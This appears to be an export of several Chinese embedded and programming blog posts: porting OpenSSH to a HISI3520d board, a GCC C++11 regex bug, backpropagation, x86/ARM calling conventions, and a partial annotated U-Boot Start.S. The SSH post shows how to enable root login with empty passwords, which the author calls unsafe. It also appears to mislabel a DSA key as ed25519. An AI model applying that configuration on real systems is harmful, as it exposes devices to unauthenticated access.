        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>反编译</tag>
        <tag>Android逆向</tag>
        <tag>smali</tag>
      </tags>
  </entry>
  <entry>
    <title>移植openssh-7.5p1(包括openssl-1.0.2l、zlib-1.2.11)到HISI3520d(部署篇)</title>
    <url>/2018/01/04/blog_idx_051/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

  此文的编译篇在：http://blog.csdn.net/u011728480/article/details/78037404
  原本不想写这篇文章的，但是最近，新的需求下来，需要配置一个ssh服务端，但是板子的nand经过精打细算之后，只剩了几MB的空间了，于是得重新对编译和部署进行整理。然后将SSH部署到板子的SD卡上去。




openssh 的部署

  首先根据编译篇的内容，将你要指定的SD卡的挂载目录参数添加上，而不是按照ssh的默认目录去部署。
  最终，configure之后得到下图：

    
        
    
   
  可以看到，我已经指定了我想要的路径，这个路径很重要，有些ssh相关的二进制文件根据编译时的参数写死了，所以，需要编译时指定。


开始部署：


首先根据前文，准备以下的文件到一个目录。


  如图：（ssh相关的bin文件和配置文件）

    
        
    
  
  （ssh 所依赖的so库）

    
        
    
  


创建相关的文件夹


mkdir -p /TFDISK/rootfs/bin/
mkdir -p /TFDISK/rootfs/sbin/
mkdir -p /TFDISK/rootfs/etc/
mkdir -p /TFDISK/rootfs/libexec/
mkdir -p /TFDISK/rootfs/share/
mkdir -p /TFDISK/rootfs/lib/
mkdir -p /var/run/
mkdir -p /var/empty/


修改相关文件夹权限以及添加ssh所需的用户组和用户


chown root:root /var/empty
chmod 755 /var/empty
addgroup sshd
adduser -G sshd -g 'sshd privsep' -h /var/empty -s /bin/ssh sshd
(添加用户时，也可直接修改/etc/passwd 文件，在最后一行添加sshd:x:74:74:Sky-SSH:/var/empty/sshd:/sbin/nologin)
//username:password:User ID:Group ID:comment:home directory:shell


复制相关文件及so库到相关的文件夹


cp sshd /TFDISK/rootfs/sbin/
cp scp sftp ssh ssh-add ssh-agent ssh-keygen ssh-keyscan ssh-pkcs11-helper /TFDISK/rootfs/bin/
cp sftp-server ssh-keysign /TFDISK/rootfs/libexec/
cp sshd_config ssh_config moduli /TFDISK/rootfs/etc/

#libcrypto.so libssl.so libz.so
cp lib*.so* /TFDISK/rootfs/lib/


到开发板上，在ssh所需的etc/目录生成相关的秘钥文件，并修改权限


cd /TFDISK/rootfs/etc/
ssh-keygen -t rsa -f ssh_host_rsa_key -N ""
ssh-keygen -t dsa -f ssh_host_dsa_key -N ""
ssh-keygen -t ecdsa -f ssh_host_ecdsa_key -N ""
ssh-keygen -t dsa -f ssh_host_ed25519_key -N ""
chmod 600 ssh_host_ed25519_key


到此，直接可以通过/TFDISK/rootfs/sbin/sshd&amp;运行，然后连接即可。（此时root和空密码是无法登录的）




号外号外：必须注意相关的额外配置


若想使用root登录，那么必须在sshd_config 里面，取消PermitRootLogin yes注释，并改值为yes，如果需要无密码登录，需要取消PermitEmptyPasswords yes注释，设置登录名密码为空（此选项不建议使用，因为我这里是开发板可以这样，毕竟不安全）。


因为上文实现了不安全的免密登录，安全的免密登录可以使用公钥来配置，具体可以去网上查找相关资料。






后记

  无
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>嵌入式</category>
      </categories>
      <tags>
        <tag>移植</tag>
        <tag>ssh</tag>
      </tags>
  </entry>
  <entry>
    <title>terminate called after throwing an instance of &#39;std::regex_error&#39;（C++11）</title>
    <url>/2017/12/29/blog_idx_050/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

  无




std::regex_error

  最近修改一个程序，增加了一些功能，为了方便移植，要用到C++11的正则表达式(正则用起来顺手)。这里我就想说明的是：TMD，GCC 语法实现了，库没有写完。。。QAQ，WC。什么不说了。
  目标：得到url(类似http://1.1.1.1:9001/group1/M00/00/37/wKgfdVoNSTKAKXAzAAD25Sg6ZTE5747.gz)中的文件名（wKgfdVoNSTKAKXAzAAD25Sg6ZTE5747.gz）。
	/*file_path = 类似http://1.1.1.1:9001/group1/M00/00/37/wKgfdVoNSTKAKXAzAAD25Sg6ZTE5747.gz
*/
    std::string Target_FileName;

    std::string pattern(".*/([^/]+\\.[a-zA-Z]+)");
    std::regex re(pattern);
    std::match_results&lt;std::string::const_iterator> result;
    //std::smatch == std::match_results&lt;std::string::const_iterator>

    if ( !std::regex_match(file_path,result,re) )&#123;

        yUpgradeLog_Msg("std::regex_match false.");
        return -1;
    &#125;
    yUpgradeLog_Msg(result.size());
    Target_FileName = result[1];
  得到了下面如图的问题：

    
        
    
   
  于是我去网上找答案，问题出在我构造正则表达式的时候。也就是这句中，std::string pattern(“.*/([^/]+\.[a-zA-Z]+)”);于是我重新修改了表达式N次还是不行，没有办法了，只有去网络海洋去在瞧一瞧看一看。
  最终，我看到了一个消息，给了我一点提示，文中说，可能和GCC版本有关，如果要正常使用C++11的正则表达式，需要注意GCC版本必须为4.9+，WC，TMD，赶紧去看看GCC版本。

    
        
    
   
  然后赶紧使用5.4的gcc再试试如下的代码，过了。我真是无F*uck说。
#include &lt;regex&gt;
#include &lt;iostream&gt;
int main()&#123;

	
    std::string pattern(&quot;.*&#x2F;([^&#x2F;]+\\.[a-zA-Z]+)&quot;);
    std::regex re(pattern);
    std::match_results&lt;std::string::const_iterator&gt; result;
    &#x2F;&#x2F;std::smatch &#x3D;&#x3D; std::match_results&lt;std::string::const_iterator&gt;
	std::string t &#x3D; &quot;http:&#x2F;&#x2F;1.1.1.1:9001&#x2F;group1&#x2F;M00&#x2F;00&#x2F;37&#x2F;wKgfdVoNSTKAKXAzAAD25Sg6ZTE5747.gz&quot;;
    if ( !std::regex_match(t,result,re) )&#123;

        std::cout&lt;&lt;&quot;std::regex_match false.&quot;;
        return -1;
    &#125;
   
 	std::cout&lt;&lt;&quot;result is &quot;&lt;&lt;result[1];
	return 0;
&#125;

    
        
    
   

    
        
    
   
  最后在说一下不用正则怎么实现的吧！(其实，下面的还要简单点，感觉自己  大写的  ZZ  了，不过涨姿势了。)
file_path="http://1.1.1.1:9001/group1/M00/00/37/wKgfdVoNSTKAKXAzAAD25Sg6ZTE5747.gz";
file_path.substr(file_path.rfind("/")+1);




后记

  无
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>C&amp;CPP</category>
      </categories>
      <tags>
        <tag>regex</tag>
        <tag>CPP</tag>
      </tags>
  </entry>
  <entry>
    <title>菜鸟角度简单分析BP算法（Error Back Propagation）</title>
    <url>/2018/02/08/blog_idx_054/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言



模型：就是一个函数G(I1,I2,…,In),此函数的作用就是给定In（输入数据）,就能够得到函数的值（打分）。


损失函数：E(w1,w2,…,wn,b1…bn),此函数是由此网络中所有的权重为变量构成的。此函数的作用是描述在某组权重的和输入下，此网络的得分与标准值（标签）的误差。


梯度：就是某变量（向量）在某方向上的变化率。


网络训练过程：而在网络训练中，目标就得把此误差减小，提高准确率。






BP 分析



对BP的一个简单例子推导过程（此过程来至于网上的一篇文章，无复杂的数学公式，注意抽象，示例图字丑，请忽略）


  假设我定义此示例网络为：

    
        
    
    


定义前向推导为：



    
        
    
    


定义此网络的损失函数E为（也可以说是误差函数）：



    
        
    
 


对权重W5,求其相对于E的偏导，过程如下：



    
        
    
 

    
        
    
 


对权重W1,求其相对于E的偏导，过程如下：



    
        
    
 
  当我们得到dE/dW1,dE/dW2 … dE/dW8 ,dE/db1,dE/db2这些的值后，我们就可以更新这些参数，让E的输出更小，准确度越高。
  定义原参数为Po，定义更新参数为Pn,定义学习率为m,则参数更新过程为：
Pn = Po - m*dE/dPo
  经过多次迭代后，E会越来越小，模型准确率越来越高。




后记

  提示：个人认为对于一些数学原理相关的，还是动手自己推导一次，这样比单单看理解的快和深刻一点。这种方式非常适合我这种笨鸟。
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>数据结构与算法</category>
        <category>DL</category>
      </categories>
      <tags>
        <tag>BP算法</tag>
      </tags>
  </entry>
  <entry>
    <title>x86 常见调用约定(cdecl,fastcall,stdcall) &amp; x86和ARM调用约定的栈帧分析 &amp; ARM ATPCS(ARM-THUMB procedure call standard)</title>
    <url>/2018/01/18/blog_idx_053/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  X86:gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.5)
  ARM:gcc version 4.8.3 20131202 (prerelease) (Hisilicon_v400)
前言

  由于某些工作的需要，我需要掌握X86以及ARM的一些调用规则，让自己可以大致看懂ASM代码。于是，我总结了一下我需要的东西。
  调用约定有啥用？
  对于现在习惯使用高级程序的人来说，这一切都是闲的蛋疼才会去看这些，不止浪费时间，还浪费表情。但对于有需求使用ASM+C或者C艹的混合编程或者纯ASM编程的时候，这就得注意这些了。因为这代表着你的目标能否成功的问题。




x86 常见调用以及对应的栈帧分析



cdecl用在C/C++，MFC的默认方式， 可变参数
//cdecl
extern "C"
int __attribute__((cdecl)) Func2(int a, int b, int c, int d, int e, int f)&#123;

	
	int aa;
	int bb;
	int cc;
	int dd;
	
	aa = bb = cc= dd = a;	

	return 0;
&#125;
@调用子程序过程
	pushl	$6
	pushl	$5
	pushl	$4
	pushl	$3
	pushl	$2
	pushl	$1
	call	Func2
	@call，eip入栈，跳转到子程序
	addl	$24, %esp
	@esp-24,清空临时栈
@子程序过程
.LFE1021:
	.size	Func1, .-Func1
	.globl	Func2
	.type	Func2, @function
Func2:
.LFB1022:
	.cfi_startproc
	pushl	%ebp
	@ebp入栈
	.cfi_def_cfa_offset 8
	.cfi_offset 5, -8
	movl	%esp, %ebp
	@esp赋值给ebp
	.cfi_def_cfa_register 5
	subl	$16, %esp
	@注意，虽然上面esp减16是由于有4个4byte的局部变量，但是如果不是4个局部变量，此版本的编译器是按照16byte*N(N取大于0的整数)来分配的局部栈。列如：3个4byte变量，局部栈大小是16bytes,5个4byte变量，局部栈大小为32bytes，其他类似方式分配，不要看不懂为啥多分配了，或者少分配了。
	movl	8(%ebp), %eax
	@a 赋值给eax
	movl	%eax, -16(%ebp)
	@ eax 赋值给dd
	movl	-16(%ebp), %eax
	movl	%eax, -12(%ebp)
	movl	-12(%ebp), %eax
	movl	%eax, -8(%ebp)
	movl	-8(%ebp), %eax
	movl	%eax, -4(%ebp)
	movl	$0, %eax
	@返回值放在eax
	leave
	@leave &#x3D; mov ebp,esp 以及 pop ebp
	.cfi_restore 5
	.cfi_def_cfa 4, 4
	ret
	@pop eip
	.cfi_endproc
  说明：按从右至左的顺序压参数入栈，由调用者把参数弹出栈。
  对子程序分析：其他详见注释。具体栈帧分布图，见下图：

    
        
    
    


stdcall，Win API
extern &quot;C&quot;
int __attribute__((stdcall)) Func3(int a, int b, int c, int d, int e, int f)&#123;
	
	int aa;
	int bb;
	int cc;

	aa &#x3D; bb &#x3D; cc;		
	
	return 0;
&#125;

pushl	$6
pushl	$5
pushl	$4
pushl	$3
pushl	$2
pushl	$1
call	Func3
.LFE1022:
	.size	Func2, .-Func2
	.globl	Func3
	.type	Func3, @function
Func3:
.LFB1023:
	.cfi_startproc
	pushl	%ebp
	.cfi_def_cfa_offset 8
	.cfi_offset 5, -8
	movl	%esp, %ebp
	.cfi_def_cfa_register 5
	subl	$16, %esp
	movl	-12(%ebp), %eax
	movl	%eax, -8(%ebp)
	movl	-8(%ebp), %eax
	movl	%eax, -4(%ebp)
	movl	$0, %eax
	leave
	.cfi_restore 5
	.cfi_def_cfa 4, 4
	ret	$24
	@pop eip , subl 24,esp
	.cfi_endproc
  说明：按从右至左的顺序压参数入栈，由被调用者从栈中弹出参数。
  其他参考见上文。


fastcall，要求速度快
extern &quot;C&quot;
int __attribute__((fastcall)) Func4(int a, int b, int c, int d, int e, int f)&#123;
	
	int aa;
	int bb;
	int cc;

	aa &#x3D; bb &#x3D; cc;	

	return 0;
&#125;
pushl	$6
pushl	$5
pushl	$4
pushl	$3
movl	$2, %edx
movl	$1, %ecx
call	Func4
.LFE1023:
	.size	Func3, .-Func3
	.globl	Func4
	.type	Func4, @function
Func4:
.LFB1024:
	.cfi_startproc
	pushl	%ebp
	.cfi_def_cfa_offset 8
	.cfi_offset 5, -8
	movl	%esp, %ebp
	.cfi_def_cfa_register 5
	subl	$24, %esp
	movl	%ecx, -20(%ebp)
	movl	%edx, -24(%ebp)
	movl	-12(%ebp), %eax
	movl	%eax, -8(%ebp)
	movl	-8(%ebp), %eax
	movl	%eax, -4(%ebp)
	movl	$0, %eax
	leave
	.cfi_restore 5
	.cfi_def_cfa 4, 4
	ret	$16
	.cfi_endproc
  说明：按从右至左的顺序压参数入栈，参数1，参数2通过ecx,edx传递，由被调用者从栈中弹出参数。
  其他参考见上文。




ARM ATPCS

extern &quot;C&quot;
int Func1(int a, int b, int c, int d, int e, int f)&#123;
	
	int aa;
	int bb;
	int cc;
	int dd;
	int ee;
	
	aa &#x3D; bb &#x3D; cc&#x3D; dd &#x3D; ee &#x3D; a;	

	return 0;
&#125;
mov	r3, #5
str	r3, [sp]
mov	r3, #6
str	r3, [sp, #4]
mov	r0, #1
mov	r1, #2
mov	r2, #3
mov	r3, #4
bl	Func1
	.text
	.align	2
	.global	Func1
	.type	Func1, %function
Func1:
	.fnstart
.LFB971:
	@ args &#x3D; 8, pretend &#x3D; 0, frame &#x3D; 40
	@ frame_needed &#x3D; 1, uses_anonymous_args &#x3D; 0
	@ link register save eliminated.
	str	fp, [sp, #-4]!
	add	fp, sp, #0
	sub	sp, sp, #44
	str	r0, [fp, #-32]
	str	r1, [fp, #-36]
	str	r2, [fp, #-40]
	str	r3, [fp, #-44]
	ldr	r3, [fp, #-32]
	str	r3, [fp, #-8]
	ldr	r3, [fp, #-8]
	str	r3, [fp, #-12]
	ldr	r3, [fp, #-12]
	str	r3, [fp, #-16]
	ldr	r3, [fp, #-16]
	str	r3, [fp, #-20]
	ldr	r3, [fp, #-20]
	str	r3, [fp, #-24]
	mov	r3, #0
	mov	r0, r3
	sub	sp, fp, #0
	@ sp needed
	ldr	fp, [sp], #4
	bx	lr
	.cantunwind
	.fnend
  分析：


r15 PC The Program Counter.


r14 LR The Link Register.


r13 SP The Stack Pointer.


r12 IP The Intra-Procedure-call scratch register. （可简单的认为暂存SP）


R11 可选，被称为FP，即frame pointer。


  其他分析见下图：

    
        
    
   
特别说明：此图保留区域写错了，对于此编译器来说，应该是4个4bytes*N(N大于0的整数)的分配本地变量的方式




后记

  无
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>嵌入式</category>
        <category>C&amp;CPP</category>
        <category>常识</category>
      </categories>
      <tags>
        <tag>x86和ARM调用约定</tag>
        <tag>cdecl.fastcall.stdcall等约定差异</tag>
      </tags>
  </entry>
  <entry>
    <title>HISI3520DV300 折腾记录（一）之 《Uboot-Start.S分析 以及 相关启动流程分析》</title>
    <url>/2018/03/09/blog_idx_055/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  uboot版本：2010.06
  前置资料：HISI3520DV300的某单板提供的SDK（datasheet，原理图）。
前言

  由于需求，需要对某板子的内存容量，以及Nand容量进行可能的“”软“”变更。（不修改硬件的情况下），于是需要研究此板子的启动模式以及内存映射相关的东西，并得到，变更后的设置，对整个系统有哪些影响。
  根据以上的需求，我对其Uboot启动过程进行了粗略的研究。




执行指令流程分析：

  本文中的分析流程是CPU从没电到上电，uboot从nand中加载执行的过程。
cpu上电
------------------------->
b	reset @进svc，关mmu，关cache
------------------------->
bne	normal_start_flow
------------------------->
bne    do_clr_remap @关闭remap（remap关闭后，0x0000 0000 - 0x03ff ffff指向片内ram，实际只有4kb），打开cache
------------------------->
bl      init_registers@ppl，mmu 等等
------------------------->
init_registers函数结束后，调用bx	lr
跳转到relocate:标号
------------------------->
搬运异常向量表到片内ram，参考copy_exception_table:标号
------------------------->
在copy_exception_table:标号中，根据_start 和 _TEXT_BASE的值，来判断uboot需不需要搬运
------------------------->
copy_loop: 开始搬运uboot到_TEXT_BASE
------------------------->
stack_setup:建立堆栈和相关的信息内存区域
------------------------->
跳转到C部分继续执行。_start_armboot：
------------------------->
注意：若想知道根据相关寄存器的值为何是这样跳转的，请参考本系列后续文章中硬件相关的分析，或者自己在datasheet上去找相关内容.这里还是要吐槽一下：海思datasheet写的有点水，好多都一概而过，没有详细的解释或者举例分析，所以我的分析也可能是有误的，更准确内容估计只有联系官方的人员了。（但是官方可能不理我们这样的小白@！！@）
我添加注释的Start.S文件如下：
  （可能会有错，因为我没有理解到位或者其提供的datasheet介绍并不详细）
  在此目录下：u-boot-2010.06\arch\arm\cpu\hi3521a
&#x2F;*
 * armboot - Startup Code for OMAP3530&#x2F;ARM Cortex CPU-core
 *
 * Copyright (c) 2004	Texas Instruments &lt;r-woodruff2@ti.com&gt;
 *
 * Copyright (c) 2001	Marius Gr枚ger &lt;mag@sysgo.de&gt;
 * Copyright (c) 2002	Alex Z眉pke &lt;azu@sysgo.de&gt;
 * Copyright (c) 2002	Gary Jennejohn &lt;garyj@denx.de&gt;
 * Copyright (c) 2003	Richard Woodruff &lt;r-woodruff2@ti.com&gt;
 * Copyright (c) 2003	Kshitij &lt;kshitij@ti.com&gt;
 * Copyright (c) 2006-2008 Syed Mohammed Khasim &lt;x0khasim@ti.com&gt;
 *
 * See file CREDITS for list of people who contributed to this
 * project.
 *
 * This program is free software; you can redistribute it and&#x2F;or
 * modify it under the terms of the GNU General Public License as
 * published by the Free Software Foundation; either version 2 of
 * the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.	 See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place, Suite 330, Boston,
 * MA 02111-1307 USA
 *&#x2F;

#include &lt;config.h&gt;
#include &lt;version.h&gt;

&#x2F;*
 *************************************************************************
 *
 * Jump vector table as in table 3.1 in [1]
 *
 *************************************************************************
 *&#x2F;


.globl _start
_start: b	reset
	ldr	pc, _undefined_instruction
	ldr	pc, _software_interrupt
	ldr	pc, _prefetch_abort
	ldr	pc, _data_abort
	ldr	pc, _not_used
	ldr	pc, _irq
	ldr	pc, _fiq

&#x2F;*

LDR &lt;reg&gt;, &#x3D; &lt;constant-expression&gt;

*&#x2F;

_undefined_instruction: .word undefined_instruction
_software_interrupt:	.word software_interrupt
_prefetch_abort:	.word prefetch_abort
_data_abort:		.word data_abort
_not_used:		.word not_used
_irq:			.word irq
_fiq:			.word fiq
_pad:			.word 0x12345678 &#x2F;* now 16*4&#x3D;64 *&#x2F;
	&#x2F;*
	.fill	repeat&#123;,   size&#125;&#123;,	 value&#125;
	Repeat：重复填充的次数
	Size：每次填充的字节，默认为1
	Value：所填充的数据，默认为0
	定义重复内存单元
	
	*&#x2F;

__blank_zone_start:
.fill 1024*4,1,0
__blank_zone_end:

.globl _blank_zone_start
_blank_zone_start:
.word __blank_zone_start


.globl _blank_zone_end
_blank_zone_end:
.word __blank_zone_end

	.balignl 16,0xdeadbeef

&#x2F;*
后面的代码，16byte对齐，不足用0xdeadbeef来填充，此值网上大部分说就是&quot;坏牛肉&quot;的意思,无特定含义，估计方便记忆
*&#x2F;
&#x2F;*************************************************************************
 *
 * Startup Code (reset vector)
 *
 * do important init only if we don&#39;t start from memory!
 * setup Memory and board specific bits prior to relocation.
 * relocate armboot to ram
 * setup stack
 *
 *************************************************************************&#x2F;

_TEXT_BASE:
	.word	TEXT_BASE

.globl _armboot_start
_armboot_start:
	.word _start

&#x2F;*
 * These are defined in the board-specific linker script.
 *&#x2F;
.globl _bss_start
_bss_start:
	.word __bss_start

.globl _bss_end
_bss_end:
	.word _end

#ifdef CONFIG_USE_IRQ
&#x2F;* IRQ stack memory (calculated at run-time) *&#x2F;
.globl IRQ_STACK_START
IRQ_STACK_START:
	.word	0x0badc0de

&#x2F;* IRQ stack memory (calculated at run-time) *&#x2F;
.globl FIQ_STACK_START
FIQ_STACK_START:
	.word 0x0badc0de
#endif

_clr_remap_fmc_entry:
    .word   FMC_TEXT_ADRS + do_clr_remap - TEXT_BASE

&#x2F;*
 * the actual reset code
 *&#x2F;

reset:
	&#x2F;*
	 * set the cpu to SVC32 mode
	 *&#x2F;
	mrs	r0, cpsr
	bic	r0, r0, #0x1f &#x2F;&#x2F;&#x2F;&#x2F;将 r0 的低 6 位清零，进入 ARM 状态（bit5） 
	orr	r0, r0, #0xd3 &#x2F;&#x2F;&#x2F;&#x2F;将 r0 低八位置位 0x11010011，禁止 IRQ、FIQ，进 入 SVC 模式
&#x2F;*
cpsr[4:0] &#x3D; 0 0011(svc)
*&#x2F;
	msr	cpsr,r0

	&#x2F;*
	 * Invalidate L1 I&#x2F;D
	 *&#x2F;
	mov	r0, #0			@ set up for MCR
	mcr	p15, 0, r0, c8, c7, 0	@ invalidate TLBs
	mcr	p15, 0, r0, c7, c5, 0	@ invalidate icache
&#x2F;*
MCR   ARM寄存器到协处理器寄存器的数据传送
MRC   协处理器寄存器到ARM寄存器的数据传送
*&#x2F;
	&#x2F;*
	 * disable MMU stuff and caches
	 *&#x2F;
	mrc	p15, 0, r0, c1, c0, 0
&#x2F;*

BIC 是 逻辑”与非” 指令, 实现的 Bit Clear的功能

*&#x2F;
	bic	r0, r0, #0x00002000	@ clear bits 13 (--V-)
	bic	r0, r0, #0x00000007	@ clear bits 2:0 (-CAM)
	orr	r0, r0, #0x00000002	@ set bit 1 (--A-) Align
	orr	r0, r0, #0x00000800	@ set bit 11 (Z---) BTB
&#x2F;*
ORR指令用于在两个操作数上进行逻辑戒运算，并把结果放置到目的寄存器中。操作数1应该是一
个寄存器，操作数2可以是一个寄存器，被移位的寄存器，或一个立即数。该指令常用于设置操
作数1的某些位。

*&#x2F;
	mcr	p15, 0, r0, c1, c0, 0

	&#x2F;*
	 *  read system register REG_SC_GEN2
         *  check if ziju flag
	 *&#x2F;
	ldr	r0, &#x3D;SYS_CTRL_REG_BASE
    ldr	r1, [r0, #REG_SC_GEN2]
    &#x2F;*
		addr:0x12050140 ------&gt; sp
	*&#x2F;
	ldr	r2, &#x3D;0x7a696a75          &#x2F;* magic for &quot;ziju&quot; *&#x2F;
	cmp	r1, r2
	bne	normal_start_flow
	&#x2F;*
	Assume nomal start
	*&#x2F;
	mov	r1, sp                   &#x2F;* save sp *&#x2F;
	str	r1, [r0, #REG_SC_GEN2]  &#x2F;* clear ziju flag *&#x2F;

	&#x2F;* init PLL&#x2F;DDRC&#x2F;pin mux&#x2F;... *&#x2F;
	ldr	r0, _blank_zone_start
	ldr	r1, _TEXT_BASE
	sub	r0, r0, r1
	ldr	r1, &#x3D;RAM_START_ADRS
	add	r0, r0, r1
	mov	r1, #0x0                 &#x2F;* flags: 0-&gt;normal 1-&gt;pm *&#x2F;
	bl	init_registers           &#x2F;* init PLL&#x2F;DDRC&#x2F;... *&#x2F;

	&#x2F;* after ziju, we need ddr traning *&#x2F;
#ifdef CONFIG_DDR_TRAINING_V2
	ldr	sp, &#x3D;STACK_TRAINING
	ldr	r0, &#x3D;REG_BASE_SCTL
	bl	start_ddr_training       &#x2F;* DDR training *&#x2F;
#endif

	ldr	r0, &#x3D;SYS_CTRL_REG_BASE
    	ldr	r1, [r0, #REG_SC_GEN2]
	mov	sp, r1		         &#x2F;* restore sp *&#x2F;
    	ldr	r1, [r0, #REG_SC_GEN3]
	mov	pc, r1                   &#x2F;* return to bootrom *&#x2F;
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	b	.                        &#x2F;* bug here *&#x2F;

normal_start_flow:

       	@if running not boot from  spi&#x2F;nand&#x2F;ddr ram,
		@we skipping boot_type checking.
		&#x2F;*
		0x1400_0000:SFC NAND&#x2F;NOR MEMORY
地址空间
		*&#x2F;
    	mov    r0, pc, lsr#24
    	cmp    r0, #0x0
    	bne    do_clr_remap

check_boot_type:
        ldr     r0, &#x3D;SYS_CTRL_REG_BASE
        ldr     r0, [r0, #REG_SYSSTAT]
        mov     r6, r0, lsr#4
	and     r6, #0x1
	&#x2F;*
		此处可能有个错误，按照datasheet应该右移31bit才行
	*&#x2F;
        cmp     r6, #0			@ [4] &#x3D; 0 FMC &#x2F;* spi nor | spi nand *&#x2F;
        ldreq   pc, _clr_remap_fmc_entry

	@otherwise, [31]&#x3D;1 means boot from bootrom, err
	beq	bug

do_clr_remap:
        &#x2F;* do clear remap *&#x2F;
    	ldr     r4, &#x3D;SYS_CTRL_REG_BASE
	ldr 	r0, [r4, #REG_SC_CTRL]
		&#x2F;&#x2F;REG_SC_CTRL reset_value:0x0000_0212,REG_SC_CTRL[9]&#x3D;1,enable remap
    	@Set clear remap bit.
    	orr 	r0, #(1&lt;&lt;8)
    	str 	r0, [r4, #REG_SC_CTRL]

	&#x2F;*
	 * Set ACTLR.SMP to 1
	 * This is a bug on Cortex-A7 MPCORE. see buglist of Cortex-A7
	 * The D-caches are disabled when ACTLR.SMP is set to 0 regardless of
	 * the value of the cache enable bit. so we must set SMP bit of ACTLR
	 * register before enable D-cache
	 *&#x2F;
	mrc     p15, 0, r0, c1, c0, 1
	orr     r0, #(1 &lt;&lt; 6)
	mcr     p15, 0, r0, c1, c0, 1

	@enable I-Cache now
 	mrc p15, 0, r0, c1, c0, 0
        orr r0, r0, #0x00001000 &#x2F;* set bit 12 (I) I-Cache *&#x2F;
        mcr p15, 0, r0, c1, c0, 0
	isb

	@Check wether I am running in dynamic mem bank
	mov r0, pc, lsr#28
	cmp r0, #8
	bleq    relocate

	ldr     r0, _blank_zone_start
	ldr     r1, _TEXT_BASE
	sub     r0, r0, r1
	adrl    r1, _start
	add     r0, r0, r1
	mov     r1, #0          &#x2F;* flags: 0-&gt;normal 1-&gt;pm *&#x2F;
	bl      init_registers
#ifdef CONFIG_DDR_TRAINING_V2
	ldr	sp, &#x3D;STACK_TRAINING
	ldr	r0, &#x3D;REG_BASE_SCTL
	bl	start_ddr_training       &#x2F;* DDR training *&#x2F;
#endif

#ifndef CONFIG_SKIP_RELOCATE_UBOOT

&#x2F;*
0x0000 0000 0x03ff ffff
地址重映射时：此地址指向
启动地址空间。
地址重映射撤销后：此地址
空间指向片内RAM

*&#x2F;
relocate:
	@copy arm exception table in 0 address
	adrl	r0, _start
	mov	r1, #0
	mov	r2, #0x100		&#x2F;* copy arm Exception table to 0 addr *&#x2F;
	add     r2, r0, r2
copy_exception_table:
	ldmia   r0!, &#123;r3 - r10&#125;
	stmia   r1!, &#123;r3 - r10&#125;
	cmp     r0, r2
	ble     copy_exception_table

	@ relocate U-Boot to RAM
	adrl	r0, _start		@ r0 &lt;- current position of code
	ldr	r1, _TEXT_BASE		@ test if we run from flash or RAM
	cmp	r0, r1			@ don t reloc during debug,
	&#x2F;&#x2F;I think ifeq may means jtag-mode(arm on chip debug) 
	beq	stack_setup

	ldr	r2, _armboot_start
	ldr	r3, _bss_start
	&#x2F;*
	Text segment
	*&#x2F;
	sub	r2, r3, r2		@ r2 &lt;- size of armboot
	add	r2, r0, r2		@ r2 &lt;- source end address

copy_loop:				@ copy 32 bytes at a time
	ldmia	r0!, &#123;r3 - r10&#125;		@ copy from source address [r0]
	stmia	r1!, &#123;r3 - r10&#125;		@ copy to   target address [r1]
	cmp	r0, r2			@ until source end addreee [r2]
	ble	copy_loop
#endif	&#x2F;* CONFIG_SKIP_RELOCATE_UBOOT *&#x2F;

	&#x2F;* Set up the stack *&#x2F;
stack_setup:
	ldr	r0, _TEXT_BASE		@ upper 128 KiB: relocated uboot
	sub	r0, r0, #CONFIG_SYS_MALLOC_LEN @ malloc area
	sub	r0, r0, #CONFIG_SYS_GBL_DATA_SIZE @ bdinfo
#ifdef CONFIG_USE_IRQ
	sub	r0, r0, #(CONFIG_STACKSIZE_IRQ + CONFIG_STACKSIZE_FIQ)
#endif
	sub	sp, r0, #12		@ leave 3 words for abort-stack
	and	sp, sp, #~7		@ 8 byte alinged for (ldr&#x2F;str)d

	&#x2F;* Clear BSS (if any). Is below tx (watch load addr - need space) *&#x2F;
clear_bss:
